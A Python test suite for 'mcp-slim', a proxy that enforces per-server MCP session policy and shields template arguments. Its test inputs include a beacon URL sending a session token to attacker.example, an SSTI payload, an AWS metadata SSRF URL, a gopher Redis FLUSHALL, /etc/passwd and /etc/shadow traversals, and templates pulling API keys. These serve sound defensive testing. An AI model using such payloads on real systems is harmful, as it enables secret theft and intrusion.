"""Unit and integration tests for mcp-slim v2.0.0:
- MS019: SessionPolicyEngine / capability-scoped multi-upstream session policy & cross-server escalation guard
- MS020: TemplateArgumentShield / recursive prompt & RFC 6570 resource template exfiltration shield
- CLI `mcp-slim policy`, `mcp-slim shield`, `wrap`, `bench`, `MCPProxy`, `mcp-slim serve`, and SARIF v2.1.0
"""

from __future__ import annotations

import contextlib
import io
import json
from pathlib import Path
import tempfile
import unittest

import mcp_slim
from mcp_slim import (
    AUDIT_SARIF_RULES,
    CapabilityScope,
    MCPProxy,
    OTelSpanExporter,
    SessionPolicy,
    SessionPolicyEngine,
    TemplateArgumentShield,
    audit_session_policy,
    build_audit_sarif,
    handle_server_rpc,
    shield_template_arguments,
)
from mcp_slim.cli import main, wrap_config


def _multi_server_policy_dict() -> dict:
    return {
        "session_id": "prod-agent-session",
        "read_only": False,
        "allow_destructive": False,
        "allow_cross_server_delegation": False,
        "allowed_upstream_ids": ["web_scraper", "analytics_db", "docs_store"],
        "max_request_payload_bytes": 4096,
        "server_scopes": {
            "web_scraper": {
                "tools_enabled": True,
                "allowed_tools": ["fetch_*", "search_*"],
                "resources_enabled": False,
                "prompts_enabled": False,
                "sampling_enabled": False,
                "roots_enabled": False,
                "elicitation_enabled": False,
                "read_only": True,
                "max_tool_calls": 2,
            },
            "analytics_db": {
                "tools_enabled": True,
                "read_only": True,
                "allow_destructive": False,
                "resources_enabled": True,
                "allowed_schemes": ["postgres", "file"],
                "denied_resource_prefixes": ["file:///etc/", "file://*/.ssh/*"],
                "prompts_enabled": True,
                "allowed_prompts": ["sql_summary_*"],
            },
            "docs_store": {
                "tools_enabled": False,
                "resources_enabled": True,
                "allowed_schemes": ["https", "file"],
                "sampling_enabled": False,
                "roots_enabled": True,
            },
        },
    }


class TestSessionPolicyEngineMS019(unittest.TestCase):
    """MS019: Capability-scoped multi-upstream MCP session policy engine."""

    def test_cross_server_namespace_escalation_blocked(self) -> None:
        engine = SessionPolicyEngine(policy=_multi_server_policy_dict(), enabled=True)
        # Untrusted web_scraper attempts to invoke analytics_db__query_rows via composite prefix
        dec = engine.evaluate_client_request(
            {
                "jsonrpc": "2.0",
                "id": 10,
                "method": "tools/call",
                "params": {"name": "analytics_db__query_rows", "arguments": {"limit": 5}},
            },
            server_id="web_scraper",
        )
        self.assertFalse(dec.allowed)
        codes = {v.violation_code for v in dec.violations}
        self.assertIn("CROSS_SERVER_ESCALATION", codes)
        self.assertEqual(dec.resolved_server_id, "analytics_db")

    def test_subword_read_only_and_destructive_classification_fail_closed(self) -> None:
        engine = SessionPolicyEngine(policy=_multi_server_policy_dict(), enabled=True)
        # 'get_dataset_offset' contains 'set' inside 'dataset'/'offset' -> subword tokenizer allows it!
        ok_dec = engine.evaluate_client_request(
            {
                "jsonrpc": "2.0",
                "id": 1,
                "method": "tools/call",
                "params": {"name": "get_dataset_offset", "arguments": {}},
            },
            server_id="analytics_db",
        )
        self.assertTrue(ok_dec.allowed)

        # 'delete_and_get_user' mixes 'delete' and 'get' -> fail-closed mutating + destructive!
        bad_dec = engine.evaluate_client_request(
            {
                "jsonrpc": "2.0",
                "id": 2,
                "method": "tools/call",
                "params": {"name": "delete_and_get_user", "arguments": {"id": 42}},
            },
            server_id="analytics_db",
        )
        self.assertFalse(bad_dec.allowed)
        codes = {v.violation_code for v in bad_dec.violations}
        self.assertIn("READ_ONLY_VIOLATION", codes)
        self.assertIn("DESTRUCTIVE_TOOL_VIOLATION", codes)

        # ToolAnnotations override lexical heuristic when registered via tools/list
        engine.register_tools_catalog(
            "analytics_db",
            [
                {
                    "name": "inspect_and_purge_snapshot",
                    "annotations": {"readOnlyHint": True, "destructiveHint": True},
                },
                {
                    "name": "custom_opaque_lookup",
                    "annotations": {"readOnlyHint": True, "destructiveHint": False},
                },
            ],
        )
        ann_ok = engine.evaluate_client_request(
            {
                "jsonrpc": "2.0",
                "id": 3,
                "method": "tools/call",
                "params": {"name": "custom_opaque_lookup"},
            },
            server_id="analytics_db",
        )
        self.assertTrue(ann_ok.allowed)

        ann_bad = engine.evaluate_client_request(
            {
                "jsonrpc": "2.0",
                "id": 4,
                "method": "tools/call",
                "params": {"name": "inspect_and_purge_snapshot"},
            },
            server_id="analytics_db",
        )
        self.assertFalse(ann_bad.allowed)
        self.assertIn("DESTRUCTIVE_TOOL_VIOLATION", {v.violation_code for v in ann_bad.violations})

    def test_call_quota_payload_ceiling_and_canonical_resource_uri_guard(self) -> None:
        engine = SessionPolicyEngine(policy=_multi_server_policy_dict(), enabled=True)
        call_frame = {
            "jsonrpc": "2.0",
            "id": 1,
            "method": "tools/call",
            "params": {"name": "fetch_page", "arguments": {"url": "https://example.com"}},
        }
        # Quota max_tool_calls=2 on web_scraper
        self.assertTrue(engine.evaluate_client_request(call_frame, server_id="web_scraper").allowed)
        self.assertTrue(engine.evaluate_client_request(call_frame, server_id="web_scraper").allowed)
        third = engine.evaluate_client_request(call_frame, server_id="web_scraper")
        self.assertFalse(third.allowed)
        self.assertEqual(third.violations[0].violation_code, "CALL_QUOTA_EXCEEDED")

        # Oversized payload (> 4096 bytes)
        huge_frame = {
            "jsonrpc": "2.0",
            "id": 9,
            "method": "tools/call",
            "params": {"name": "get_metrics", "arguments": {"blob": "x" * 5000}},
        }
        oversized = engine.evaluate_client_request(huge_frame, server_id="analytics_db")
        self.assertFalse(oversized.allowed)
        self.assertIn("PAYLOAD_SIZE_EXCEEDED", {v.violation_code for v in oversized.violations})

        # Canonicalized dot-segment traversal against denied_resource_prefixes ('file:///etc/')
        res_traversal = engine.evaluate_client_request(
            {
                "jsonrpc": "2.0",
                "id": 11,
                "method": "resources/read",
                "params": {"uri": "file:///var/log/%2e%2e/%2e%2e/etc/passwd"},
            },
            server_id="analytics_db",
        )
        self.assertFalse(res_traversal.allowed)
        self.assertIn("FORBIDDEN_RESOURCE_ACCESS", {v.violation_code for v in res_traversal.violations})

    def test_server_reverse_rpc_and_transcript_audit(self) -> None:
        pol = SessionPolicy.from_dict(_multi_server_policy_dict())
        self.assertEqual(pol.to_dict()["session_id"], "prod-agent-session")
        engine = SessionPolicyEngine(policy=pol, enabled=True)

        events = [
            {
                "direction": "client_to_server",
                "server_id": "unlisted_shadow_srv",
                "frame": {"jsonrpc": "2.0", "id": 1, "method": "tools/list"},
            },
            {
                "direction": "server_to_client",
                "server_id": "web_scraper",
                "frame": {"jsonrpc": "2.0", "id": 50, "method": "sampling/createMessage", "params": {}},
            },
            {
                "direction": "server_to_client",
                "server_id": "web_scraper",
                "frame": {"jsonrpc": "2.0", "id": 51, "method": "roots/list", "params": {}},
            },
            {
                "direction": "server_to_client",
                "server_id": "docs_store",
                "frame": {"jsonrpc": "2.0", "id": 52, "method": "roots/list", "params": {}},
            },
        ]
        rep = engine.audit_session_transcript(events)
        self.assertFalse(rep["valid"])
        # Event 0 (unauthorized upstream + default scope), Event 1 (sampling), Event 2 (roots); Event 3 is allowed!
        self.assertEqual(rep["violation_count"], 3)
        sarif = build_audit_sarif(rep, source_uri="transcript.json")
        self.assertEqual(sarif["runs"][0]["results"][0]["ruleId"], "MS019")


class TestTemplateArgumentShieldMS020(unittest.TestCase):
    """MS020: Recursive prompt and RFC 6570 resource template exfiltration shield."""

    def test_stack_matched_nesting_depth_and_fixed_point_sanitization(self) -> None:
        shield = TemplateArgumentShield(enabled=True, max_depth=1, block_exfiltration=True)
        # Sibling single-depth expressions remain depth 1, whereas nested '{{ {{x}} }}' is depth 2
        self.assertEqual(shield.calculate_expansion_depth("Hello {{first}} and {{last}}!"), 1)
        self.assertEqual(shield.calculate_expansion_depth("{{ outer {{ inner }} + {{ sibling }} }}"), 2)
        self.assertEqual(shield.calculate_expansion_depth("${ outer ${ inner ${ leaf } } }"), 3)

        clean_dec = shield.audit_prompt_arguments(
            "welcome_prompt",
            {"greeting": "Hello {{user_name}}, welcome to {{project}}!"},
            max_depth=1,
        )
        self.assertTrue(clean_dec.allowed)

        nested_dec = shield.audit_prompt_arguments(
            "welcome_prompt",
            {"payload": "{{ outer {{ env.GITHUB_TOKEN }} }}"},
            max_depth=1,
        )
        self.assertFalse(nested_dec.allowed)
        codes = {v.violation_code for v in nested_dec.violations}
        self.assertIn("RECURSIVE_EXPANSION_DEPTH", codes)
        self.assertIn("SECRET_EXFILTRATION_PAYLOAD", codes)
        # Fixed-point sanitizer strips both inner and outer '{{ ... }}' delimiters!
        self.assertNotIn("{{", nested_dec.sanitized_arguments["payload"])
        self.assertNotIn("GITHUB_TOKEN", nested_dec.sanitized_arguments["payload"])

    def test_cross_argument_cycle_and_transitive_chain_detection(self) -> None:
        # 3-way Billion-Laughs style cycle: a -> b -> c -> a
        cyc_dec = shield_template_arguments(
            "prompt",
            {
                "a": "prefix {{b}}",
                "b": "middle ${c}",
                "c": "loop {{a}}",
            },
            max_depth=1,
        )
        self.assertFalse(cyc_dec.allowed)
        self.assertIn(
            "CROSS_ARG_EXPANSION_CYCLE",
            {v.violation_code for v in cyc_dec.violations},
        )

        # Acyclic 2-hop chain: root -> mid -> leaf ("literal") exceeds max_depth=1
        chain_dec = shield_template_arguments(
            "prompt",
            {
                "root": "start {{mid}}",
                "mid": "next {{leaf}}",
                "leaf": "plain text",
            },
            max_depth=1,
        )
        self.assertFalse(chain_dec.allowed)
        self.assertIn(
            "TRANSITIVE_EXPANSION_DEPTH",
            {v.violation_code for v in chain_dec.violations},
        )

    def test_rfc6570_uri_template_breakout_ssrf_ssti_and_double_encoding(self) -> None:
        # Single-segment {user_id} placeholder rejects smuggled '../' or '?admin=1', while {+subpath} allows '/'
        uri_dec = shield_template_arguments(
            "resource",
            {
                "user_id": "alice%252f..%252fadmin?role=superuser",
                "subpath": "2026/11/report.md",
            },
            uri_template="https://api.corp.internal/users/{user_id}/files/{+subpath}",
        )
        self.assertFalse(uri_dec.allowed)
        viol_keys = {(v.argument_key, v.violation_code) for v in uri_dec.violations}
        self.assertIn(("user_id", "URI_TEMPLATE_SEGMENT_BREAKOUT"), viol_keys)
        self.assertNotIn(("subpath", "URI_TEMPLATE_SEGMENT_BREAKOUT"), viol_keys)

        # SSTI, AWS IMDSv2 IPv6/IPv4 SSRF, gopher:// scheme, null byte, and beacon URL exfiltration
        multi_dec = shield_template_arguments(
            "prompt",
            {
                "ssti": "{{ ''.__class__.__mro__[1].__subclasses__() }}",
                "ssrf": "http://169.254.169.254/latest/meta-data/iam/",
                "scheme": "gopher://internal-redis:6379/_FLUSHALL",
                "null_inj": "report.pdf%00.txt",
                "beacon": "https://attacker.example/collect?secret={{session_token}}",
            },
        )
        self.assertFalse(multi_dec.allowed)
        codes = {v.violation_code for v in multi_dec.violations}
        self.assertTrue(
            {
                "SSTI_EXPRESSION",
                "SSRF_METADATA_IN_TEMPLATE",
                "UNAUTHORIZED_SCHEME_IN_TEMPLATE",
                "NULL_BYTE_INJECTION",
                "SECRET_EXFILTRATION_PAYLOAD",
            }.issubset(codes)
        )


class TestProxyCliAndServeV200(unittest.TestCase):
    """End-to-end integration tests for MCPProxy, CLI, serve, and SARIF in v2.0.0."""

    def test_mcp_proxy_enforces_session_policy_and_template_shield(self) -> None:
        with tempfile.TemporaryDirectory() as tmpdir:
            otel_path = Path(tmpdir) / "spans.jsonl"
            proxy = MCPProxy(
                quiet=True,
                no_stats=True,
                enforce_session_policy=True,
                session_policy=_multi_server_policy_dict(),
                server_id="analytics_db",
                shield_templates=True,
                max_template_depth=1,
                otel_exporter=OTelSpanExporter(path=otel_path),
            )

            # 1. tools/list filters out mutating & destructive tools under read_only analytics_db scope
            req_list = proxy.process_client_message(
                json.dumps({"jsonrpc": "2.0", "id": 1, "method": "tools/list"}) + "\n"
            )
            self.assertTrue(req_list)
            srv_list = proxy.process_server_message(
                json.dumps({
                    "jsonrpc": "2.0",
                    "id": 1,
                    "result": {
                        "tools": [
                            {"name": "query_sales", "description": "Read sales", "inputSchema": {"type": "object"}},
                            {"name": "drop_sales_table", "description": "Drop sales", "inputSchema": {"type": "object"}},
                        ]
                    },
                })
                + "\n"
            )
            exposed = [t["name"] for t in json.loads(srv_list)["result"]["tools"]]
            self.assertEqual(exposed, ["query_sales"])

            # 2. Cross-server escalation call blocked by MS019
            out_esc = proxy.process_client_message(
                json.dumps({
                    "jsonrpc": "2.0",
                    "id": 2,
                    "method": "tools/call",
                    "params": {"name": "web_scraper__fetch_url", "arguments": {}},
                })
                + "\n"
            )
            self.assertEqual(out_esc, "")
            local_esc = json.loads(proxy.pop_local_responses()[0])
            self.assertTrue(local_esc["result"]["isError"])
            self.assertIn("MS019", local_esc["result"]["content"][0]["text"])
            self.assertEqual(proxy.stats.policy_violations_blocked, 1)

            # 3. Recursive prompt exfiltration blocked by MS020
            out_tpl = proxy.process_client_message(
                json.dumps({
                    "jsonrpc": "2.0",
                    "id": 3,
                    "method": "prompts/get",
                    "params": {
                        "name": "sql_summary_daily",
                        "arguments": {"filter": "{{ outer {{ env.AWS_SECRET_ACCESS_KEY }} }}"},
                    },
                })
                + "\n"
            )
            self.assertEqual(out_tpl, "")
            local_tpl = json.loads(proxy.pop_local_responses()[0])
            self.assertEqual(local_tpl["error"]["code"], -32602)
            self.assertIn("MS020", local_tpl["error"]["message"])
            self.assertEqual(proxy.stats.template_exfiltrations_blocked, 1)

            # 4. Server-initiated unauthorized roots/list blocked by MS019
            srv_roots = proxy.process_server_message(
                json.dumps({"jsonrpc": "2.0", "id": 77, "method": "roots/list", "params": {}}) + "\n"
            )
            self.assertEqual(srv_roots, "")
            srv_err = json.loads(proxy.pop_local_server_responses()[0])
            self.assertEqual(srv_err["error"]["code"], -32600)
            self.assertEqual(proxy.stats.policy_violations_blocked, 2)

            spans = [json.loads(line) for line in otel_path.read_text(encoding="utf-8").splitlines() if line]
            self.assertTrue(any(s["attributes"].get("mcp_slim.policy_violation_blocked") for s in spans))
            self.assertTrue(any(s["attributes"].get("mcp_slim.template_exfiltration_blocked") for s in spans))

    def test_cli_policy_shield_wrap_bench_and_serve_tools(self) -> None:
        self.assertEqual(mcp_slim.__version__, "2.0.0")
        self.assertEqual(len(AUDIT_SARIF_RULES), 20)

        with tempfile.TemporaryDirectory() as tmpdir:
            tmp = Path(tmpdir)
            pol_file = tmp / "policy.json"
            tx_file = tmp / "tx.json"
            pol_sarif = tmp / "policy.sarif"
            args_file = tmp / "tpl_args.json"
            tpl_sarif = tmp / "shield.sarif"
            mcp_cfg = tmp / "mcp.json"

            pol_file.write_text(json.dumps(_multi_server_policy_dict()), encoding="utf-8")
            tx_file.write_text(
                json.dumps([
                    {
                        "direction": "client_to_server",
                        "server_id": "web_scraper",
                        "frame": {
                            "jsonrpc": "2.0",
                            "id": 1,
                            "method": "tools/call",
                            "params": {"name": "analytics_db__query_rows"},
                        },
                    }
                ]),
                encoding="utf-8",
            )
            args_file.write_text(
                json.dumps({
                    "template_type": "resource",
                    "uri_template": "file:///workspace/docs/{doc}",
                    "arguments": {"doc": "../../etc/shadow"},
                }),
                encoding="utf-8",
            )

            buf_pol = io.StringIO()
            with contextlib.redirect_stdout(buf_pol):
                rc_pol = main([
                    "policy",
                    str(pol_file),
                    str(tx_file),
                    "--json",
                    "--sarif",
                    str(pol_sarif),
                    "--fail-on-violation",
                ])
            self.assertEqual(rc_pol, 2)
            self.assertEqual(json.loads(buf_pol.getvalue())["violation_count"], 1)
            sarif_p = json.loads(pol_sarif.read_text(encoding="utf-8"))
            self.assertEqual(sarif_p["runs"][0]["results"][0]["ruleId"], "MS019")

            buf_sh = io.StringIO()
            with contextlib.redirect_stdout(buf_sh):
                rc_sh = main([
                    "shield",
                    str(args_file),
                    "--json",
                    "--sarif",
                    str(tpl_sarif),
                    "--fail-on-violation",
                ])
            self.assertEqual(rc_sh, 2)
            self.assertGreaterEqual(json.loads(buf_sh.getvalue())["violation_count"], 1)
            sarif_s = json.loads(tpl_sarif.read_text(encoding="utf-8"))
            self.assertEqual(sarif_s["runs"][0]["results"][0]["ruleId"], "MS020")

            # wrap_config injects --session-policy, per-entry --server-id, and --shield-templates
            mcp_cfg.write_text(
                json.dumps({
                    "mcpServers": {
                        "analytics_db": {"command": "uvx", "args": ["mcp-server-postgres"]}
                    }
                }),
                encoding="utf-8",
            )
            wrap_config(
                mcp_cfg,
                in_place=True,
                session_policy=str(pol_file),
                shield_templates=True,
                max_template_depth=2,
            )
            wrapped_args = json.loads(mcp_cfg.read_text(encoding="utf-8"))["mcpServers"]["analytics_db"]["args"]
            self.assertIn("--session-policy", wrapped_args)
            self.assertIn("analytics_db", wrapped_args)
            self.assertIn("--shield-templates", wrapped_args)
            self.assertIn("2", wrapped_args)

            # bench --json includes security_bench metrics
            buf_bench = io.StringIO()
            with contextlib.redirect_stdout(buf_bench):
                rc_b = main(["bench", "--turns", "3", "--json"])
            self.assertEqual(rc_b, 0)
            bench_out = json.loads(buf_bench.getvalue())
            self.assertEqual(bench_out["security_bench"]["policy_escalations_blocked"], 3)
            self.assertEqual(bench_out["security_bench"]["template_exfiltrations_blocked"], 3)

            # mcp-slim serve exposes evaluate_session_policy and shield_mcp_template_args
            pol_rpc = handle_server_rpc({
                "jsonrpc": "2.0",
                "id": 10,
                "method": "tools/call",
                "params": {
                    "name": "evaluate_session_policy",
                    "arguments": {
                        "policy": _multi_server_policy_dict(),
                        "server_id": "web_scraper",
                        "frame": {
                            "jsonrpc": "2.0",
                            "id": 1,
                            "method": "tools/call",
                            "params": {"name": "analytics_db__query_rows"},
                        },
                    },
                },
            })
            assert pol_rpc is not None
            self.assertFalse(json.loads(pol_rpc["result"]["content"][0]["text"])["allowed"])

            sh_rpc = handle_server_rpc({
                "jsonrpc": "2.0",
                "id": 11,
                "method": "tools/call",
                "params": {
                    "name": "shield_mcp_template_args",
                    "arguments": {
                        "template_type": "prompt",
                        "arguments": {"msg": "{{ nested {{ env.OPENAI_API_KEY }} }}"},
                    },
                },
            })
            assert sh_rpc is not None
            sh_res = json.loads(sh_rpc["result"]["content"][0]["text"])
            self.assertFalse(sh_res["allowed"])
            self.assertGreaterEqual(sh_res["violation_count"], 1)


if __name__ == "__main__":
    unittest.main()
